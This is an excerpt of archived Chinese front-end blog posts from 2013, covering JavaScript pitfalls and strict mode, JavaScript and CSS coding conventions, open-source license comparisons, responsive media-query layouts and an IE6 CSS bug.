    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. JavaScript是一门弱语言，她使用起来不像C/C++那样有十分繁琐的内存管理、类型定义等，所以学习JavaScript的门槛相对来说也比较低。门槛低并不意味着这门语言很简单，我们在使用的时候会遇到各种千奇百怪的问题，有些是因为浏览器的兼容性引起的，有些是因为JS语法本身所引起的，还有些是因为ECMAScript标准的改变而引起的，总之，这样的问题很多，下面列举几个比较容易忽略的点 1. switch的case判断 123456var t = event.keyCode;switch (t) &#123; case &apos;65&apos;: alert(&quot;Yay!&quot;); break;&#125; 当keycode为65时，你会发现，咦？怎么木有alert！ 这里需要明确的是，switch在判断的时候使用的是全等号\===”，全等号在比较的时候首先看数据类型是不是一样的，而在这里，t是Number类型，而’65’是String。 2. 严格模式下this&ne;window 1234&quot;use strict&quot;;var global = (function() &#123; console.log(this); //undefined&#125;)(); 有时候我们需要用global来缓存this这个全局环境（可能是window，也可能是其他的，比如在Worker中没有window对象，用self代表Global），但是在严格模式下函数作用域返回的this为undefined，一般，我们可以采用如下方式获取到Global对象： 12345&quot;use strict&quot;;var global = (function() &#123; var t = new Function(&quot;return this&quot;)(); console.log(t);&#125;)(); 或者： 12345&quot;use strict&quot;;var global = (function() &#123; var t = window.eval(&quot;this&quot;); console.log(t);&#125;)(); 因为new Function是在全局作用域上执行的，所以返回的是Global对象，下面的eval需要一起注意，eval前如果不交window，那它便处于function作用域中（javascript利用function里分隔作用域），自然不会返回window或者全局对象。使用Function要注意一点： 1234(function () &#123; var local = 1; new Function(&quot;console.log(typeof local);&quot;)(); // logs undefined&#125;()); new Function工作在Global作用域链下，所以是访问不到匿名函数中local的~ 3. 变量提升（Hoisting） 12345var t = &quot;global&quot;;function foo()&#123; console.log(t); //undefined return; var t = &quot;local&quot;;&#125; 这是一个老生常谈的问题，var最好不好到处散布。所谓的变量提升，在这里存在两个作用域，一个是Global作用域，他下面有t和foo这两个变量，而foo指向的是foo作用域，foo作用域下有一个t变量，画个图演示下吧 123456[Global Scope] |----- t [String] undefined -&gt; &quot;global&quot; |----- foo [Reference] [foo Scope][foo Scope] |----- t [String] undefined -&gt; &quot;local&quot; 刚进入全局作用域链的时候，程序扫描到t和foo两个变量，于是给这个t赋值为undefined，扫面完了之后，看到t有值，于是给赋值”global\，foo指向[foo Scope]，于是进入[foo Scope]，继续扫描函数作用域链下的变量，发现目标t之后，赋值为undefined，在console.log时，是这样的： 1234var t = &quot;global&quot;;function foo()&#123; var t; // 等同于 -&gt; var t = undefined; console.log(t); //undefined return; var t = &quot;local&quot;; &#125; 上面的例子写不写return结果都是一样的，加return，只是为了更好的表达变量提升这个动作的存在。一般比较推荐的变量定义方式： 12345function foo(a, b, c) &#123; var x = 1, bar, baz = &quot;something&quot;;&#125; 一个var，后边连着一串变量的定义。 附：javascript严格模式下要注意的地方（转自次碳酸钴） &nbsp;1. 变量必须声明才能使用 12&quot;use strict&quot;;a=1; //缺少var语句做声明，因此报错 12&quot;use strict&quot;;var a=b=1; //错误 b未声明 &nbsp;2. 函数声明语句（不包括表达式）不允许在普通代码块（不包括闭包）中使用 123456789&quot;use strict&quot;;(function()&#123; //闭包中是允许使用函数声明语句的 function func()&#123;&#125;;&#125;)();&#123; var f=function()&#123;&#125;; //函数声明表达式允许 function func()&#123;&#125;; //函数声明语句在普通闭包中，错误&#125;; 3. 闭包内的this不指向Global对象 1234&quot;use strict&quot;;(function()&#123; alert(this); //输出undefined&#125;)(); 4. 对象属性和函数形参不能重复声明 123&quot;use strict&quot;;var o=&#123;a:1,a:1&#125;;//这个对象定义了两个a属性，因此报错 123&quot;use strict&quot;;function func(a,a)&#123;&#125;;//这个函数的两个形参都是a，因此报错 5. eval拥有类似闭包的作用域 123456&quot;use strict&quot;;var a=1,b=1;eval(&quot;var a=2&quot;);window.eval(&quot;var b=2&quot;);alert(a); //输出1 因为运行的a变成了eval作用域的局部变量alert(b); //输出2 window.eval依然是全局作用域 6. callee和caller属性无法使用 12345&quot;use strict&quot;;function func()&#123; return arguments.callee; //错误 callee无法使用&#125;;func(); 7. with语句无法使用 12&quot;use strict&quot;;with(&#123;&#125;); 8. 八进制数字常量无法使用 123&quot;use strict&quot;;var a=0999; //十进制，可以使用var b=0123; //八禁止，无法使用 9. 普通模式下的一些无效操作变成错误 1234&quot;use strict&quot;;var a=1;delete a;//错误 无法删除var声明的变量 1234&quot;use strict&quot;;var o=&#123;get a()&#123;&#125;&#125;;o.a=1;//错误 给只读属性赋值 简单总结这么多，推荐\次碳酸钴“童鞋的博客，细致入微、内容深刻，博客入口：http://www.web-tinker.com关于JavaScript strict mode的详细介绍，请移步：MDN Strict_mode]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端编码规范之JavaScript]]></title>
    <url>%2Fblog%2F2013%2F08%2F14%2F2013-08-14-cb-javascript-spec%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上次浅谈了下关于CSS的编码规范，大部分童鞋持赞同意见，仍存在一些童鞋不太理解这些规范的意义。 如果是个人或者小作坊开发，其实这些所谓的编码规范也没啥意思，因为大家写好的代码直接就给扔到网上去了，很少有打包、压缩、校检等过程，别人来修改你代码的情况也比较少。但是，对于一定规模的团队来说，这些东西还是挺有必要的！一个是保持代码的整洁美观，同时良好的代码编写格式和注释方式可以让后来者很快地了解你代码的大概思路，提高开发效率。 那么这次，继续抛砖引玉，说说Javascript一些需要引起注意的地方（这些东西也是团队开发的时候大家集思广益总结出来的）。不规范写法举例1.&nbsp;句尾没有分号 1var isHotel = json.type == &quot;hotel&quot; ? true : false 2.&nbsp;变量命名各种各样 123var is_hotel;var isHotel;var ishotel; 3.&nbsp;if 缩写 1234if (isHotel) console.log(true)else console.log(false) 4.&nbsp;使用 eval 1var json = eval(jsonText); 5.&nbsp;变量未定义到处都是 123456function() &#123; var isHotel = &apos;true&apos;; ....... var html = isHotel ? &apos;&lt;p&gt;hotel&lt;/p&gt;&apos; : &quot;&quot;;&#125; 6.&nbsp;超长函数 12345function() &#123; var isHotel = &apos;true&apos;; //....... 此处省略500行 return false;&#125; 7.&nbsp;………. 书写不规范的代码让我们难以维护，有时候也让我们头疼。 （禁止）、（必须）等字眼，在这里只是表示强调，未严格要求。前端规范之JavaScript&nbsp;1.&nbsp;tab键用（必须）用四个空格代替这个原因已经在前端编码规范之CSS说过了，不再赘述。 2. 每句代码后（必须）加”;“&nbsp;这个是要引起注意的，比如： 1234a = b // 赋值(function()&#123; //....&#125;)() // 自执行函数 &nbsp;未加分号，结果被解析成 1a = b(function()&#123;//...&#125;)() //将b()()返回的结果赋值给a &nbsp;这是截然不同的两个结果，所以对于这个问题必须引起重视！！！ 3.&nbsp;变量、常量、类的命名按（必须）以下规则执行： 1）&nbsp;变量：必须采用骆驼峰的命名且首字母小写 123456789// 正确的命名 var isHotel, isHotelBeijing, isHotelBeijingHandian; // 不推荐的命名 var is_Hotel, ishotelbeijing, IsHotelBeiJing; 2）&nbsp;常量：必须采用全大写的命名，且单词以_分割，常量通常用于ajax请求url，和一些不会改变的数据 123// 正确的命名 var HOTEL_GET_URL = &apos;http://map.baidu.com/detail&apos;, PLACE_TYPE = &apos;hotel&apos;; 3）&nbsp;类：必须采用骆驼峰的命名且首字母大写，如： 1234// 正确的写法 var FooAndToo = function(name) &#123; this.name = name; &#125; 4.&nbsp;空格的使用 1）if中的空格，先上例子 123456789//正确的写法 if (isOk) &#123; console.log(&quot;ok&quot;); &#125; //不推荐的写法 if(isOk)&#123; console.log(&quot;ok&quot;); &#125; ()中的判断条件前后都(必须)加空格()里的判断前后(禁止)加空格，如：正确的写法:&nbsp;if (isOk)；不推荐的写法:&nbsp;if ( isOk ) 2）switch中的空格, 先上例子1234567891011121314151617181920212223242526//正确的写法 switch(name) &#123; case &quot;hotel&quot;: console.log(name); break; case &quot;moive&quot;: console.log(name); break; default: // code &#125; //不推荐的写法 switch (name) &#123; // switch 后不应该有空格, 正确的写法: switch(name) &#123; // code case &quot;hotel&quot;: console.log(name); break; // break; 应该和console.log对齐 case &quot;movie&quot;: // 每个case之前需要有换行 console.log(name); break; // break; 应该和console.log对齐 default: // code &#125;&nbsp; 3）for中的空格，先上例子123456789101112131415// 正确的写法 var names = [&quot;hotel&quot;, &quot;movie&quot;], i, len; for (i=0, len=names.length; i &lt; len; i++) &#123; // code &#125; // 不推荐的写法 var names = [&quot;hotel&quot;, &quot;movie&quot;], i, len; for(i = 0, len = names.length;i &lt; len;i++) &#123; // for后应该有空格，每个`;`号后需要有空格，变量的赋值不应该有空格 // code &#125;for后（必须）加空格每个;后（必须）加空格()中禁止用var声明变量; 且变量的赋值&nbsp;=&nbsp;前后（禁止）加空格 4）function&nbsp;中的空格, 先上例子12345678910111213// 正确的写法 function call(name) &#123; &#125; var cell = function () &#123; &#125;; // 不推荐的写法 var call = function(name)&#123; // code &#125;参数的反括号后（必须）加空格function&nbsp;后（必须）加空格 5）var&nbsp;中空格及定义，先上例子12345678// 一个推荐的var写法组 function(res) &#123; var code = 1 + 1, json = JSON.parse(res), type, html; // code &#125;声明变量&nbsp;=&nbsp;前后（必须）添加空格每个变量的赋值声明以,结束后（必须）换行进行下一个变量赋值声明（推荐）将所有不需要进行赋值的变量声明放置最后一行，且变量之间不需要换行（推荐）当一组变量声明完成后，空一行后编写其余代码 5.&nbsp;在同一个函数内部，局部变量的声明必须置于顶端因为即使放到中间，js解析器也会提升至顶部（hosting） 1234567891011121314151617181920// 正确的书写var clear = function(el) &#123; var id = el.id, name = el.getAttribute(&quot;data-name&quot;); ......... return true;&#125;// 不推荐的书写var clear = function(el) &#123; var id = el.id; ...... var name = el.getAttribute(&quot;data-name&quot;); ......... return true;&#125; &nbsp;推荐阅读：JavaScript-Scoping-and-Hoisting 6.&nbsp;块内函数必须用局部变量声明 1234567891011121314151617181920212223// 错误的写法 var call = function(name) &#123; if (name == &quot;hotel&quot;) &#123; function foo() &#123; console.log(&quot;hotel foo&quot;); &#125; &#125; foo &amp;&amp; foo(); &#125; // 推荐的写法 var call = function(name) &#123; var foo; if (name == &quot;hotel&quot;) &#123; foo = function() &#123; console.log(&quot;hotel foo&quot;); &#125; &#125; foo &amp;&amp; foo(); &#125; 引起的bug：第一种写法foo的声明被提前了; 调用call时：第一种写法会调用foo函数，第二种写法不会调用foo函数注：不同浏览器解析不同，具体请移步汤姆大叔深入解析Javascript函数篇 7. （禁止）使用eval，采取$.parseJSON&nbsp;三个原因：有注入风险，尤其是ajax返回数据不方便debug效率低，eval是一个执行效率很低的函数建议： 使用new Function来代替eval的使用，最好就别用。 8.&nbsp;除了三目运算，if,else等（禁止）简写 12345678910111213// 正确的书写if (true) &#123; alert(name);&#125;console.log(name);// 不推荐的书写if (true) alert(name);console.log(name);// 不推荐的书写if (true)alert(name);console.log(name) 9. （推荐）在需要以{}闭合的代码段前增加换行，如：for&nbsp;if 12345678910111213141516171819202122232425262728293031// 没有换行，小的代码段无法区分if (wl &amp;&amp; wl.length) &#123; for (i = 0, l = wl.length; i &lt; l; ++i) &#123; p = wl[i]; type = Y.Lang.type(r[p]); if (s.hasOwnProperty(p)) &#123; if (merge &amp;&amp; type == &apos;object&apos;) &#123; Y.mix(r[p], s[p]); &#125; else if (ov || !(p in r)) &#123; r[p] = s[p]; &#125; &#125; &#125;&#125;// 有了换行，逻辑清楚多了if (wl &amp;&amp; wl.length) &#123; for (i = 0, l = wl.length; i &lt; l; ++i) &#123; p = wl[i]; type = Y.Lang.type(r[p]); if (s.hasOwnProperty(p)) &#123; // 处理merge逻辑 if (merge &amp;&amp; type == &apos;object&apos;) &#123; Y.mix(r[p], s[p]); &#125; else if (ov || !(p in r)) &#123; r[p] = s[p]; &#125; &#125; &#125;&#125; 换行可以是空行，也可以是注释 10. （推荐）使用Function进行类的定义，(不推荐)继承，如需继承采用成熟的类库实现继承 123456789101112131415161718// 类的实现 function Person(name) &#123; this.name = name; &#125; Person.prototype.sayName = function() &#123; alert(this.name); &#125;; var me = new Person(&quot;Nicholas&quot;); // 将this放到局部变量self function Persion(name, sex) &#123; var self = this; self.name = name; self.sex = sex; &#125; &nbsp;平时咱们写代码，基本都是小程序，真心用不上什么继承，而且继承并不是JS的擅长的语言特性，尽量少用。如果非要使用的话，注意一点： 12345678function A()&#123; //...&#125;function B()&#123; //...&#125;B.prototype = new A();B.prototype.constructor = B; //原则上，记得把这句话加上 &nbsp;继承从原则上来讲，别改变他的构造函数，否则这个继承就显得很别扭了~&nbsp; 11. (推荐)使用局部变量缓存反复查找的对象(包括但不限于全局变量、dom查询结果、作用域链较深的对象) 1234567// 缓存对象var getComment = function() &#123; var dom = $(&quot;#common-container&quot;), // 缓存dom appendTo = $.appendTo, // 缓存全局变量 data = this.json.data; // 缓存作用域链较深的对象&#125; &nbsp;&nbsp;12.&nbsp;当需要缓存this时必须使用self变量进行缓存 123456789// 缓存this function Row(name) &#123; var self = this; self.name = name; $(&quot;.row&quot;).click(function() &#123; self.getName(); &#125;); &#125; &nbsp;self是一个保留字，不过用它也没关系。在这里，看个人爱好吧，可以用_this, that, me等这些词，都行，但是团队开发的时候统一下比较好。 13. （不推荐）超长函数, 当函数超过100行，就要想想是否能将函数拆为两个或多个函数 14. 等你来填坑~ 小结 规范是死的，罗列这些东西，目的是为了让程序猿们对这些东西引起注意，平时写代码的时候注意格式，不仅仅方便了自己，也让其他阅读者看得舒服。 可能还有一些点没有涉及到，如果你有好的建议，请提出来，我们一起打造一个良好的前端生态环境！ 相关阅读：前端编码规范之CSS]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[五种开源协议的比较(BSD,Apache,GPL,LGPL,MIT) – 整理]]></title>
    <url>%2Fblog%2F2013%2F08%2F13%2F2013-08-13-cb-license%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 当Adobe、Microsoft、Sun等一系列巨头开始表现出对”开源”的青睐时，”开源”的时代即将到来！最初来自：sinoprise.com/read.php?tid-662-page-e-fpage-1.html（遗憾的是这个链接已经打不开了），我基本未改动，只是进行了一些排版和整理。参考文献：http://www.fsf.org/licensing/licenses/现今存在的开源协议很多，而经过Open Source Initiative组织通过批准的开源协议目前有58种（http://www.opensource.org/licenses/alphabetical）。我们在常见的开源协议如BSD, GPL, LGPL,MIT等都是OSI批准的协议。如果要开源自己的代码，最好也是选择这些被批准的开源协议。这里我们来看四种最常用的开源协议及它们的适用范围，供那些准备开源或者使用开源产品的开发人员/厂家参考。BSD开源协议（original BSD license、FreeBSD license、Original BSD license）BSD开源协议是一个给于使用者很大自由的协议。基本上使用者可以”为所欲为”,可以自由的使用，修改源代码，也可以将修改后的代码作为开源或者专有软件再发布。但”为所欲为”的前提当你发布使用了BSD协议的代码，或则以BSD协议代码为基础做二次开发自己的产品时，需要满足三个条件：如果再发布的产品中包含源代码，则在源代码中必须带有原来代码中的BSD协议。如果再发布的只是二进制类库/软件，则需要在类库/软件的文档和版权声明中包含原来代码中的BSD协议。不可以用开源代码的作者/机构名字和原来产品的名字做市场推广。BSD 代码鼓励代码共享，但需要尊重代码作者的著作权。BSD由于允许使用者修改和重新发布代码，也允许使用或在BSD代码上开发商业软件发布和销售，因此是对商业集成很友好的协议。而很多的公司企业在选用开源产品的时候都首选BSD协议，因为可以完全控制这些第三方的代码，在必要的时候可以修改或者二次开发。Apache Licence 2.0（Apache License, Version 2.0、Apache License, Version 1.1、Apache License, Version 1.0）Apache Licence是著名的非盈利开源组织Apache采用的协议。该协议和BSD类似，同样鼓励代码共享和尊重原作者的著作权，同样允许代码修改，再发布（作为开源或商业软件）。需要满足的条件也和BSD类似：需要给代码的用户一份Apache Licence如果你修改了代码，需要再被修改的文件中说明。在延伸的代码中（修改和有源代码衍生的代码中）需要带有原来代码中的协议，商标，专利声明和其他原来作者规定需要包含的说明。如果再发布的产品中包含一个Notice文件，则在Notice文件中需要带有Apache Licence。你可以在Notice中增加自己的许可，但不可以表现为对Apache Licence构成更改。Apache Licence也是对商业应用友好的许可。使用者也可以在需要的时候修改代码来满足需要并作为开源或商业产品发布/销售。GPL（GNU General Public License）我们很熟悉的Linux就是采用了GPL。GPL协议和BSD, Apache Licence等鼓励代码重用的许可很不一样。GPL的出发点是代码的开源/免费使用和引用/修改/衍生代码的开源/免费使用，但不允许修改后和衍生的代码做为闭源的商业软件发布和销售。这也就是为什么我们能用免费的各种linux，包括商业公司的linux和linux上各种各样的由个人，组织，以及商业软件公司开发的免费软件了。GPL协议的主要内容是只要在一个软件中使用(\使用”指类库引用，修改后的代码或者衍生代码)GPL 协议的产品，则该软件产品必须也采用GPL协议，既必须也是开源和免费。这就是所谓的”传染性”。GPL协议的产品作为一个单独的产品使用没有任何问题，还可以享受免费的优势。由于GPL严格要求使用了GPL类库的软件产品必须使用GPL协议，对于使用GPL协议的开源代码，商业软件或者对代码有保密要求的部门就不适合集成/采用作为类库和二次开发的基础。其它细节如再发布的时候需要伴随GPL协议等和BSD/Apache等类似。LGPL（GNU Lesser General Public License）LGPL是GPL的一个为主要为类库使用设计的开源协议。和GPL要求任何使用/修改/衍生之GPL类库的的软件必须采用GPL协议不同。LGPL允许商业软件通过类库引用(link)方式使用LGPL类库而不需要开源商业软件的代码。这使得采用LGPL协议的开源代码可以被商业软件作为类库引用并发布和销售。但是如果修改LGPL协议的代码或者衍生，则所有修改的代码，涉及修改部分的额外代码和衍生的代码都必须采用LGPL协议。因此LGPL协议的开源代码很适合作为第三方类库被商业软件引用，但不适合希望以LGPL协议代码为基础，通过修改和衍生的方式做二次开发的商业软件采用。GPL/LGPL都保障原作者的知识产权，避免有人利用开源代码复制并开发类似的产品MIT（MIT）MIT是和BSD一样宽范的许可协议,作者只想保留版权,而无任何其他了限制.也就是说,你必须在你的发行版里包含原许可协议的声明,无论你是以二进制发布的还是以源代码发布的.本文来自：http://www.awflasher.com/blog/archives/939]]></content>
      <categories>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些年，我们一起玩过的响应式布局]]></title>
    <url>%2Fblog%2F2013%2F08%2F11%2F2013-08-11-cb-responsive-web-desigin%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. &nbsp;博客园的资源很丰富，也很精彩。不过这些精彩的东西放到一些移动终端上阅览就不堪入目了，体验相当不好。&nbsp;&nbsp;&nbsp;你可以忍受每一次打开博客，还得放大屏幕阅读么？整个屏幕都挤满了很小很小的文字，反正我是受够了。&nbsp;所以，我们需要改变！！！ 先看看什么是响应式布局，你所看的这篇文章就是采用响应时布局~ （现代浏览器才能看到效果） 什么是响应式布局 我的理解就是，为了让用户享受更好的体验效果，给用户展现最有价值的信息，让同一个页面在不同终端上有不一样的展现效果。比如你正在阅读的这篇博客，当你缩小（放大）浏览器窗口时（先滚动顶部，因为顶部做了比较多的修改，效果比较明显），你会看到这些神奇的效果。正常情况下，顶部是这样的：稍微缩小一点，是这样的：变化一：about那个块不见了变化二：浮动的推荐&lt;反对框偏移了再缩小一点：变化一：背景图片不见了变化二：右侧sidebar块跑到文章下面去了还可以再小一点， 这个变化就相当大了，很多东西都不见了，元素的位置也改变了 那么，什么是响应式布局，你有了一定的理解么~ 技术什么的不是关键，关键是设计 技术太普遍了，大家都会用，可是真正让用户感到舒适的，还是好的设计。我是这样考虑的：1. 屏幕分类： 根据移动终端的尺寸（分辨率），我大概做了这么些分类： ←480px &nbsp; 481px~700px &nbsp; 701px~960px &nbsp; 961px→ 首先搞清楚你的用户群所使用的终端类型和比例，这是2012年第二季度的统计数据 iPhone、Nokia、HTC、Samsung和Moto 五个品牌的移动终端位居前五位，占比分别为22.13%、13.98 和11.69%、10.87% 和7.47%，其次为Huawei、Sony 和ZTE 等。 感兴趣的话，可以去搜搜这些终端的分辨率是多少，然后针对这些数据做一个分类~我不多说了。 2. 不同的需求 一个比较小的屏幕能够容纳多少数据，展现多少信息，这一点必须把握住，比如当设备宽度是480像素的时候，我们没必要展现太多的信息，因为你展现出来用户也不会看，这些冗余信息只会影响用户对信息主次的判断，甚至他们会觉得这些冗余信息太多，而跳过你的内容。 我的设计是这样的：&nbsp;我的页面只包括这些内容，像随笔分类、随笔档案，友情链接，推荐链接等，这些信息又多又占空间，应该去除!&nbsp;再比如：刚开始的时候，那个推荐&lt;反对的块及贴在文章的右侧，当窗口缩小之后，我把他放到了右下角，再小些，为了展示更多的内容，直接把他给隐藏了~ 关于技术 技术核心是Media Query，网上都说烂了。给推荐两篇博文：The State Of Responsive Web Design响应式布局这件小事这两个博客的布局也是响应式布局。 需要注意的几个点： 1. head中记得加上这句话： 1&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width; initial-scale=1.0&quot;&gt; 如果不加，效果就是本文第一章图所示，文字会很小很多的挤在一个页面上。 2. media query虽然好用，但是低版本IE不支持，不要纠结，咱把他给忽视掉~O(&cap;_&cap;)O~ 如果你太固执一定要考虑的话，推荐这个：//code.google.com/p/css3-mediaqueries-js/ 123&lt;!--[if lt IE 9]&gt; &lt;script src=&quot;http://css3-mediaqueries-js.googlecode.com/svn/trunk/css3-mediaqueries.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; 把这句话加到你的代码顶部，我试过了，相当不好用，响应式效果甚微。 关于测试工具 1. 这个网站，你可以试试，戳测试工具 2. chrome下有一个插件，叫做Moblile/Tablet Divice Testing，下载地址：戳我 本文响应式布局代码 说了半天，有些童鞋可能等不及想去试试了~晒晒我弄的几行代码，有兴趣的可以参考下：../file/media-480.css 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156/*====================== media =========================*/@media screen and (max-width: 480px) &#123; html, body &#123; background: none; &#125; ul#topMnu, a.minyx, #rss, #sideLeft, #sideRight, #menu, #profile_block &#123; display: none; &#125; div#container &#123; width: 96%; padding: 0 2%; min-width: 0 !important; &#125; div#content &#123; margin-right: 0; float: none; padding-top: 310px; &#125; div#sidebar &#123; margin-left: 0; width: 100%; float: none; &#125; .commentbox_title, #tbCommentBody &#123; width: 96%; &#125; #about &#123; position: absolute; width: 96%; top: 80px; &#125; #div_digg &#123; position: static; &#125; #skyking-footer &#123; margin-top: 30px; padding: 15px 20px 0; &#125; #skyking-footer div &#123; width: 100%; &#125; #skyking-footer span &#123; float: none; border: none; padding: 0; width: 100%; display: inline-block; margin-bottom: 15px; &#125; #skyking-footer p &#123; margin: 0; text-indent: 2em; &#125;&#125;@media screen and (min-width: 481px) and (max-width: 699px) &#123; html, body &#123; background: none; &#125; ul#topMnu, a.minyx, #rss &#123; display: none; &#125; div#container &#123; width: 96%; padding: 0 2%; min-width: 0 !important; &#125; div#content &#123; margin-right: 0; float: none; &#125; div#sidebar &#123; margin-left: 0; width: 100%; float: none; &#125; #about &#123; position: static; &#125; .commentbox_title, #tbCommentBody &#123; width: 96%; &#125; #skyking-footer &#123; margin-top: 30px; padding: 15px 20px 0; &#125; #skyking-footer div &#123; width: 100%; &#125; #skyking-footer span &#123; float: none; border: none; padding: 0; width: 100%; display: inline-block; margin-bottom: 15px; &#125; #skyking-footer p &#123; margin: 0; text-indent: 2em; &#125; #div_digg &#123; right: 15px; &#125;&#125;@media screen and (min-width: 700px) and (max-width: 960px) &#123; div#container &#123; width: 96%; padding: 0 2%; min-width: 0 !important; &#125; #wrapper &#123; overflow-x:hidden; &#125; #skyking-footer div &#123; width: 100%; &#125; #skyking-footer span &#123; float: left; margin-bottom: 15px; margin-left: 1%; width: 22%; min-height: 120px; &#125; div#sidebar div#sideRight, div#sidebar div#sideLeft &#123; float: none; width: auto; &#125; div#content &#123; margin-right: 32%; &#125; div#sidebar &#123; width: 30%; margin-left: -30%; &#125; #about &#123; position: static; display:none; &#125; #div_digg &#123; right: 15px; &#125;&#125;meida query 小结 响应式布局是这几年很流行的一个设计理念，随着移动互联网的盛行，为解决如今各式各样的浏览器分辨率以及不同移动设备的显示效果，响应式布局显得十分重要。设计虽好，我觉得也存在诸如一下的一些弊端： 1. 页面需要加载更多额外的内容，比如我们的手机看这个页面的话，体验效果还行，但是那些次要的内容依然被加载进来了，没看看见是因为被我display:none给隐藏了。所以，如果想得到好的用户体验，同时节省流量的话，应该在加载之前做一些判断。 2. 还是存在兼容性问题，要知道，现在IE6-8所占的市场份额仍然在40%+，这么庞大的用户群我们暂时是不能忽略的，若引用其他的JS来矫正，这个太费资源，不可取，而且事实表明这些JS并不好用。 P.S：本文图片都是直接截屏，没有做优化处理，整个页面体积过于庞大，看来图片的优化和lazyload很有必要啊！！！下次弄一个简洁版的lazyload用用~~&nbsp;最后。。。来一张萌图，哈哈哈~]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IE6的一个小bug]]></title>
    <url>%2Fblog%2F2013%2F08%2F09%2F2013-08-09-cb-css-bug-in-IE6%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 123456789101112131415&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;//www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns=&quot;//www.w3.org/1999/xhtml&quot;&gt;&lt;head&gt; &lt;title&gt;&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; &lt;!-- p&#123;font-size:12px;&#125; p:first-letter&#123;font-size:300%&#125; --&gt; &lt;/style&gt;&lt;/head&gt; &lt;body&gt; &lt;p&gt;对于世界而言，你是一个人；但是对于某个人，你是他的整个世界。纵然伤心，也不要愁眉不展，因为你不知是谁会爱上你的笑容。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 这段代码对&lt;p&gt;的首字符样式定义在IE6上看是没有效果的,而在p:first-letter和{font-size:300%}加上空格，也就是p:first-letter {font-size:300%}后，显示就正常了。&nbsp;这个问题主要是出现在IE6浏览器中，而且这位朋友也说明了一些必要的触发条件：&nbsp;1、IE6浏览器&nbsp;2、选择符是带有伪类的&nbsp;3、伪类中必须是有连接符-“的，例如:first-letter&nbsp;4、是否有空格的存在 本文转自：http://www.jb51.net/web/20615.html]]></content>
      <categories>
        <category>JavaScript</category>
        <category>剪贴板</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>兼容性</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端编码规范之CSS]]></title>
    <url>%2Fblog%2F2013%2F08%2F09%2F2013-08-09-cb-css-spec%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. “字是门面书是屋”，我们不会去手写代码，但是敲出来的代码要好看、有条理，这还必须得有一点约束~ 团队开发中，每个人的编码风格都不尽相同，有时候可能存在很大的差异，为了便于压缩组件对代码进行压缩以及书写样式的规范统一和美观，很有必要大家一起来研究一套基本规范（模板）！ 我先抛砖引玉。（禁止）、（必须）等字眼，在这里只是表示强调，未严格要求。 前端规范之CSS 1. tab键用（必须）四个空格代替 因为在不同系统的编辑工具对tab解析不一样，windows下的tab键是占四个空格的位置，而在linux下会变成占八个空格的位置（除非你自己设定了tab键所占的位置长度）。 一些童鞋可能会有疑问，tab键换成四个空格，多麻烦啊~ 其实不然，我平时用sublime text比较多，在这个工具中可以对tab键进行设置。 选择Indent Using Spaces，Tab Width：4两项即可。 2. 每个样式属性后（必须）加 “;“方便压缩工具”断句”。 3. Class命名中（禁止）出现大写字母，（必须）采用” - \对class中的字母分隔，如： 123456789/* 正确的写法 */.hotel-title &#123; font-weight: bold;&#125;/* 不推荐的写法 */.hotelTitle &#123; font-weight: bold;&#125; 用”-“隔开比使用驼峰是更加清晰。产品线-产品-模块-子模块，命名的时候也可以使用这种方式（@Artwl） 4. 空格的使用，以下规则（必须）执行： 123.hotel-content &#123; font-weight: bold;&#125; 选择器与&nbsp;{&nbsp;之前（必须）要有空格属性名的&nbsp;:&nbsp;后（必须）要有空格属性名的&nbsp;:&nbsp;前（禁止）加空格一个原因是美观，其次IE 6存在一个bug， 戳bug5.多选择器规则之间（必须）换行当样式针对多个选择器时每个选择器占一行123456/* 推荐的写法 */a.btn,input.btn,input[type=&quot;button&quot;] &#123; ......&#125;6. （禁止）将样式写为单行, 如1.hotel-content &#123;margin: 10px; background-color: #efefef;&#125;单行显示不好注释，不好备注，这应该是压缩工具的活儿~7. （禁止）向&nbsp;0&nbsp;后添加单位, 如：123.obj &#123; left: 0px;&#125;只是为了统一。记住，绿色字表强调，不表强制！8. （禁止）使用css原生import使用css原生import有很多弊端，比如会增加请求数等….推荐文章：Don’t use @import9. （推荐）属性的书写顺序, 举个例子:1234567891011121314.hotel-content &#123; /* 定位 */ display: block; position: absolute; left: 0; top: 0; /* 盒模型 */ width: 50px; height: 50px; margin: 10px; border: 1px solid black; / *其他* / color: #efefef; &#125;定位相关, 常见的有：display&nbsp;position&nbsp;left&nbsp;top&nbsp;float&nbsp;等盒模型相关, 常见的有：width&nbsp;height&nbsp;margin&nbsp;padding&nbsp;border&nbsp;等其他属性&nbsp; &nbsp;按照这样的顺序书写可见提升浏览器渲染dom的性能 